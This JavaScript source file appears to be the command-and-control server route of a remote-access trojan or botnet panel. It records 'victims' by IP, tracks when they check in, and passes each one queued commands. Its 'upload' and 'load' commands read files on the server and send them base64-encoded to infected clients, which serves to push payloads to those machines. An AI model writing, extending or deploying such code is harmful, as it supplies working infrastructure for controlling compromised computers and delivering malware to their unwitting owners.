var express = require('express');
var router = express.Router();
var user_md = require('../models/user');
var victims_md = require('../models/victims');
var helper = require('../helpers/helper');
var fs = require('fs');

router.get('/', function(req, res) {
    var params = req.query;

    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    ip = ip.split(':');
    ip = ip[ip.length - 1];

    var now = new Date();
    params.requested_at = now;
    params.IP = ip;

    var data = victims_md.getVictim(params);
    data.then(function(result){
        if(result[0]){
            data = victims_md.updateVictim(params);
            data.then(function(result){
                var id = victims_md.getID(params);
                if(id){
                    id.then(function(ids){
                        var command = victims_md.getCommandByID(ids[0].id);
                        command.then(function(commands){
                            if(commands[0].command){
                                var arr_cmd = commands[0].command.split(';');
                                var command_type = arr_cmd[0].split(' ')[0];
                                if(command_type == 'upload'){
                                    var path_file = arr_cmd[0].substr(arr_cmd[0].indexOf(' ') + 1);
                                    var arr_file = path_file.split('\\');
                                    var name = arr_file[arr_file.length - 1];
                                    fs.readFile(path_file, function(err, data){
                                        if(err) throw err;
                                        var base64 = Buffer.from(data).toString('base64');
                                        console.log(base64);
                                        res.status(200).json({id: ids[0].id, command: "upload " + name, buf: base64});
                                    });
                                }else if(command_type == 'load'){
                                    var path_file = arr_cmd[0].substr(arr_cmd[0].indexOf(' ') + 1);
                                    fs.readFile(path_file, function(err, data){
                                        if(err) throw err;
                                        var base64 = Buffer.from(data).toString('base64');
                                        console.log(base64);
                                        res.status(200).json({id: ids[0].id, command: "load", buf: base64});
                                    });
                                }else {
                                    res.status(200).json({id: ids[0].id, command: arr_cmd[0]});
                                }

                                var cmd = "";
                                for(var i = 1; i < arr_cmd.length; i++){
                                    cmd = cmd + arr_cmd[i] + ";";
                                }
                                if(cmd){
                                    cmd = cmd.slice(0, -1);
                                }
                                var update = victims_md.updateCommandByID(ids[0].id, cmd);
                                update.then(function(result){

                                }).catch(function(err){
                                    res.end('ERROR1');
                                })
                            }else{
                                res.end('Update OK');
                            }
                        }).catch(function(err){
                            res.end('ERROR2');
                        });
                    }).catch(function(err){
                        res.end('ERROR3');
                    });
                }
            }).catch(function(err){
                res.end('ERROR4');
            });
        }else{
            data = victims_md.addVictim(params);
            data.then(function(result){
                res.end('Add OK');
            }).catch(function(err){
                res.end('ERROR5');
            });
        }
    }).catch(function(err){
        res.end('ERROR6');
    });

});

module.exports = router;
